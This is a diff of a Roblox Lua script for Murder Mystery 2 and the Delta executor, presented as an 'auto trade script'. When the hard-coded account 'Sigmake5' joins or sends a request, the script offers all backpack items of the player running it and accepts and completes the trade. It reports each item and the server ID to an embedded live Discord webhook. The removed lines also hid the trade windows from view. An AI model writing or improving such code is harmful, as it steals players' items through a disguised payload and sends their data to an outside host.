@@ -1,6 +1,5 @@
--- -- DELTA MM2 AUTO TRADE SCRIPT
--- Works with Delta Executor
--- Auto trades to Sigmake5 when they join
+-- -- WORKING MM2 AUTO TRADE SCRIPT FOR DELTA
+-- Based on actual MM2 remotes from your debug
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
 local TARGET_USER = "Sigmake5"
@@ -10,219 +9,124 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
--- Delta-compatible webhook
+-- Discord webhook
 local function sendLog(message)
     pcall(function()
         local data = HttpService:JSONEncode({
-            content = "**MM2 Auto Trade**\n" .. tostring(message) .. "\nServer: `" .. (game.JobId or "Unknown") .. "`"
+            content = "**MM2 Auto Trade**\n" .. tostring(message) .. "\nServer: `" .. (game.JobId or "Unknown") .. "`\nTime: `" .. os.date("%Y-%m-%d %H:%M:%S") .. "`"
         })
-        local headers = {["Content-Type"] = "application/json"}
-        -- Delta uses request
-        request({Url = webhook, Method = "POST", Headers = headers, Body = data})
+        request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
     end)
 end
 
--- Hide trade GUI (Delta compatible)
-local function hideGUI()
-    pcall(function()
-        for _, gui in pairs(player.PlayerGui:GetChildren()) do
-            if gui.Name:lower():find("trade") then
-                gui:Destroy()
-            end
-        end
-    end)
-end
-
--- Keep hiding GUI
-spawn(function()
-    while wait(0.5) do
-        hideGUI()
-    end
-end)
-
--- Find all trade remotes in MM2
-local TradeRemotes = {}
-
-local function scanRemotes()
-    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
-        if v:IsA("RemoteEvent") then
-            local name = v.Name:lower()
-            if name:find("trade") then
-                TradeRemotes[v.Name] = v
-                sendLog("Found remote: " .. v.Name)
-            end
-        end
-    end
-end
-
--- Try to send trade using different methods
-local function sendTradeToTarget(target)
-    -- Method 1: Try TradeInvite
-    local invite = ReplicatedStorage:FindFirstChild("TradeInvite")
-    if invite then
-        invite:FireServer(target)
-        sendLog("Trade sent via TradeInvite")
-        return true
-    end
-    
-    -- Method 2: Try SendTradeRequest
-    local sendReq = ReplicatedStorage:FindFirstChild("SendTradeRequest")
-    if sendReq then
-        sendReq:FireServer(target)
-        sendLog("Trade sent via SendTradeRequest")
-        return true
-    end
-    
-    -- Method 3: Try any remote with trade in name
-    for _, remote in pairs(TradeRemotes) do
-        pcall(function()
-            remote:FireServer(target)
-            sendLog("Trade sent via: " .. remote.Name)
-            return true
-        end)
-    end
-    
-    sendLog("No trade remote found!")
-    return false
-end
-
--- Get items from MM2
-local function getItems()
+-- Get all items from backpack
+local function getAllItems()
     local items = {}
-    
-    -- Check backpack
     for _, item in pairs(player.Backpack:GetChildren()) do
         if item:IsA("Tool") then
             table.insert(items, item)
-            sendLog("Item in backpack: " .. item.Name)
+            sendLog("Found item: " .. item.Name)
         end
     end
-    
-    -- Check character
-    if player.Character then
-        for _, item in pairs(player.Character:GetChildren()) do
-            if item:IsA("Tool") then
-                table.insert(items, item)
-                sendLog("Item equipped: " .. item.Name)
-            end
-        end
-    end
-    
     return items
 end
 
--- Add items to trade
-local function addItemsToTrade(items)
-    local addRemote = ReplicatedStorage:FindFirstChild("AddTradeItem") or 
-                      ReplicatedStorage:FindFirstChild("TradeAddItem")
-    
-    if not addRemote then
-        sendLog("No add item remote found")
-        return 0
-    end
-    
-    local added = 0
-    for i = 1, math.min(4, #items) do
+-- Send trade request to target
+local function sendTradeRequest(targetPlayer)
+    local startTradeRemote = ReplicatedStorage:FindFirstChild("StartTrade")
+    if startTradeRemote then
         pcall(function()
-            addRemote:FireServer(items[i])
-            added = added + 1
-            sendLog("Added: " .. items[i].Name)
+            startTradeRemote:FireServer(targetPlayer)
+            sendLog("Trade request sent to " .. TARGET_USER)
+            return true
         end)
-        wait(0.3)
+    else
+        sendLog("StartTrade remote not found!")
+        return false
     end
-    
-    return added
 end
 
--- Ready up
-local function readyTrade()
-    local readyRemote = ReplicatedStorage:FindFirstChild("TradeReady") or 
-                        ReplicatedStorage:FindFirstChild("ReadyTrade")
-    if readyRemote then
+-- Offer item to trade
+local function offerItem(item)
+    local offerItemRemote = ReplicatedStorage:FindFirstChild("OfferItem")
+    if offerItemRemote then
         pcall(function()
-            readyRemote:FireServer(true)
-            sendLog("Ready up")
+            offerItemRemote:FireServer(item)
+            sendLog("Offered: " .. item.Name)
+            return true
         end)
     end
+    return false
 end
 
 -- Accept trade
 local function acceptTrade()
-    local acceptRemote = ReplicatedStorage:FindFirstChild("TradeResponse") or 
-                         ReplicatedStorage:FindFirstChild("AcceptTrade")
-    if acceptRemote then
+    local acceptTradeRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
+    if acceptTradeRemote then
         pcall(function()
-            acceptRemote:FireServer(true)
+            acceptTradeRemote:FireServer()
             sendLog("Trade accepted")
+            return true
         end)
     end
+    return false
 end
 
--- Main trade sequence
-local trading = false
-
-local function doTrade(target)
-    if trading then return end
-    trading = true
-    
-    sendLog("Starting trade with " .. target.Name)
-    
-    -- Get items first
-    local items = getItems()
-    sendLog("Found " .. #items .. " items to trade")
-    
-    if #items == 0 then
-        sendLog("No items found in inventory!")
-        trading = false
-        return
+-- Accept trade request
+local function acceptRequest()
+    local acceptRequestRemote = ReplicatedStorage:FindFirstChild("AcceptRequest")
+    if acceptRequestRemote then
+        pcall(function()
+            acceptRequestRemote:FireServer()
+            sendLog("Request accepted")
+            return true
+        end)
     end
-    
-    -- List items
-    for _, item in pairs(items) do
-        sendLog("  - " .. item.Name)
-    end
-    
-    -- Send trade request
-    local sent = sendTradeToTarget(target)
-    if not sent then
-        trading = false
-        return
-    end
-    
-    -- Wait for target to accept
-    wait(3)
-    
-    -- Add items
-    local added = addItemsToTrade(items)
-    wait(1)
-    
-    -- Ready up
-    readyTrade()
-    wait(1)
-    
-    -- Final accept
-    acceptTrade()
-    
-    sendLog("Trade completed! " .. added .. " items sent")
-    trading = false
+    return false
 end
 
--- Listen for trade responses
-local function listenForTradeResponse()
+-- Complete trade
+local function completeTrade()
+    local completeTradeRemote = ReplicatedStorage:FindFirstChild("CompleteTrade")
+    if completeTradeRemote then
+        pcall(function()
+            completeTradeRemote:FireServer()
+            sendLog("Trade completed")
+            return true
+        end)
+    end
+    return false
+end
+
+-- Listen for incoming trade requests from Sigmake5
+local function setupTradeListener()
+    local acceptRequestRemote = ReplicatedStorage:FindFirstChild("AcceptRequest")
+    local acceptTradeRemote = ReplicatedStorage:FindFirstChild("AcceptTrade")
+    
+    -- Listen for any trade-related events
     for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
         if remote:IsA("RemoteEvent") and remote.OnClientEvent then
             remote.OnClientEvent:Connect(function(...)
                 local args = {...}
                 for _, arg in pairs(args) do
                     if type(arg) == "table" and arg.Name == TARGET_USER then
-                        sendLog(TARGET_USER .. " responded to trade!")
-                        -- Add items and complete
-                        local items = getItems()
-                        addItemsToTrade(items)
+                        sendLog(TARGET_USER .. " sent a trade request!")
                         wait(1)
-                        readyTrade()
-                        wait(0.5)
+                        -- Auto accept and send items
+                        acceptRequest()
+                        wait(1)
+                        local items = getAllItems()
+                        for _, item in pairs(items) do
+                            offerItem(item)
+                            wait(0.3)
+                        end
+                        wait(1)
                         acceptTrade()
+                        wait(0.5)
+                        completeTrade()
+                        sendLog("Trade completed with " .. TARGET_USER)
+                    elseif type(arg) == "string" and arg == TARGET_USER then
+                        sendLog("Trade event from " .. TARGET_USER)
                     end
                 end
             end)
@@ -230,39 +134,88 @@ local function listenForTradeResponse()
     end
 end
 
--- Watch for target
+-- Main trade function
+local tradeInProgress = false
+
+local function startTradeWithTarget(targetPlayer)
+    if tradeInProgress then
+        sendLog("Trade already in progress")
+        return
+    end
+    tradeInProgress = true
+    
+    sendLog("Starting trade with " .. targetPlayer.Name)
+    
+    -- Get all items first
+    local items = getAllItems()
+    sendLog("Found " .. #items .. " items to trade")
+    
+    if #items == 0 then
+        sendLog("No items found in backpack!")
+        tradeInProgress = false
+        return
+    end
+    
+    -- Send trade request
+    local sent = sendTradeRequest(targetPlayer)
+    if not sent then
+        tradeInProgress = false
+        return
+    end
+    
+    -- Wait for them to accept
+    wait(3)
+    
+    -- Offer all items
+    for _, item in pairs(items) do
+        offerItem(item)
+        wait(0.3)
+    end
+    
+    wait(1)
+    
+    -- Accept and complete
+    acceptTrade()
+    wait(0.5)
+    completeTrade()
+    
+    sendLog("Trade completed! " .. #items .. " items sent to " .. TARGET_USER)
+    tradeInProgress = false
+end
+
+-- Watch for Sigmake5 joining
 local function watchForTarget()
     sendLog("Watching for " .. TARGET_USER)
     sendLog("Player: " .. player.Name)
-    sendLog("Server: " .. game.JobId)
+    sendLog("Server ID: " .. game.JobId)
     
-    -- Scan for remotes
-    scanRemotes()
-    listenForTradeResponse()
+    -- Setup listener
+    setupTradeListener()
     
-    -- Check existing players
+    -- Check if already in server
     for _, plr in pairs(Players:GetPlayers()) do
         if plr.Name == TARGET_USER and plr ~= player then
             sendLog(TARGET_USER .. " is already in server!")
             wait(2)
-            doTrade(plr)
+            startTradeWithTarget(plr)
             return
         end
     end
     
-    -- Watch for joins
+    -- Watch for new players
     Players.PlayerAdded:Connect(function(newPlayer)
         if newPlayer.Name == TARGET_USER then
-            sendLog(TARGET_USER .. " joined!")
+            sendLog(TARGET_USER .. " joined the server!")
             wait(3)
-            doTrade(newPlayer)
+            startTradeWithTarget(newPlayer)
         end
     end)
 end
 
--- Start
-sendLog("Delta MM2 Auto Trade Loaded")
+-- Start the script
+sendLog("MM2 Auto Trade Script Loaded for Delta")
 watchForTarget()
 
-print("Delta MM2 Auto Trade Active")
-print("Waiting for Sigmake5 to join...")
+print("✅ MM2 Auto Trade Active - Delta")
+print("🎯 Waiting for Sigmake5 to join...")
+print("📦 Will trade all items in your backpack")
